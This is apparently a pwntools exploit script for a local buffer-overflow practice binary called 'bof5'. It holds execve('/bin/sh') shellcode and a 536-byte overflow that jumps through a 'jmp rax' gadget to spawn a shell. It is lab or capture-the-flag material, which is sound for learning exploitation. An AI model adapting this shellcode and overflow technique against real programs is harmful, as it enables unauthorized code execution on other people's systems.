#!/usr/bin/python3

from pwn import *

elf = ELF('./bof5')
context.arch = 'amd64'
p = process(elf.path)

# ... rest of your code

#######################################rop_chain######################################
ret = 0x000000000040101a
jmp_rax=0x000000000040110c
shell =asm('''
	mov rax, 29400045130965551
	push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
	''', arch='amd64')
pause()
p.sendafter(b'>', shell)
payload = b'A'*536
# payload += p64(ret)
payload +=p64(jmp_rax)
p.sendafter(b'>',payload)
p.interactive()
